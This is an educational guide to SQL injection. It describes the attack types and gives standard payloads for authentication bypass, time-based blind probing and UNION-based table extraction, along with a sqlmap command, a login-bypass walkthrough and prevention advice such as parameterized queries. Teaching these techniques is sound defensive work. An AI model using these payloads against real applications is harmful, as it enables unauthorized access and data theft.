 SQL Injection Guide

## What is SQL Injection?

SQL Injection is a code injection technique that allows attackers to manipulate SQL queries by injecting malicious input into an application. This can lead to unauthorized data access, data modification, or even complete database compromise.

---

## Common Exploits

1. **Authentication Bypass**: Gaining unauthorized access without valid credentials.
2. **Data Extraction**: Retrieving sensitive information from the database.
3. **Database Destruction**: Altering or deleting critical tables or databases.

---

## Types of SQL Injection

### 1. Classic (In-band) SQL Injection
- Exploits direct responses from the database.
- **Example**: 
  ```sql
  ' OR '1'='1' --
  ```

### 2. Blind SQL Injection
- Relies on observing application behavior instead of direct database responses.
- **Example**:
  ```sql
  ' OR IF(1=1, SLEEP(5), NULL) --
  ```

### 3. Out-of-Band SQL Injection
- Uses alternative channels (e.g., DNS or HTTP requests) to exfiltrate data.
- **Example**: 
  Exploiting DNS-based data extraction with crafted payloads.

---

## Examples of SQL Injection Payloads

### 1. Basic Payload: Authentication Bypass
```sql
' OR '1'='1' --
```

### 2. Union-Based Injection: Discover Columns
```sql
' UNION SELECT NULL, NULL, NULL --
```

### 3. Extract Data: Retrieve Table Names
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

---

## Tools for Testing SQL Injection

1. **SQLMap**:
   - An open-source tool that automates SQL Injection testing.
   - **Example**:
     ```bash
     sqlmap -u "http://example.com/page?id=1" --dbs
     ```

2. **Burp Suite**:
   - A professional tool for intercepting and modifying HTTP requests to test vulnerabilities.

3. **Havij** *(Legacy)*:
   - An older automated SQL Injection tool with a GUI. It is useful for understanding basic attacks but is no longer actively maintained.

---

## Example Scenario

A vulnerable login page processes the following query:
```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass';
```

An attacker can inject:
```sql
' OR '1'='1' --
```

This transforms the query into:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' -- AND password = '';
```

Result: The attacker gains access without valid credentials.

---

## Prevention Techniques

1. **Use Parameterized Queries**:
   - Avoid embedding user input directly into queries.
   - **Example (Python)**:
     ```python
     cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
     ```

2. **Validate and Sanitize Inputs**:
   - Ensure user inputs conform to expected formats.

3. **Implement Least Privilege Access**:
   - Restrict database permissions to prevent unauthorized actions.

4. **Deploy a Web Application Firewall (WAF)**:
   - WAFs can detect and block malicious payloads in real-time.

---

## References

- [OWASP SQL Injection Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [SQLMap Official Documentation](https://sqlmap.org/)

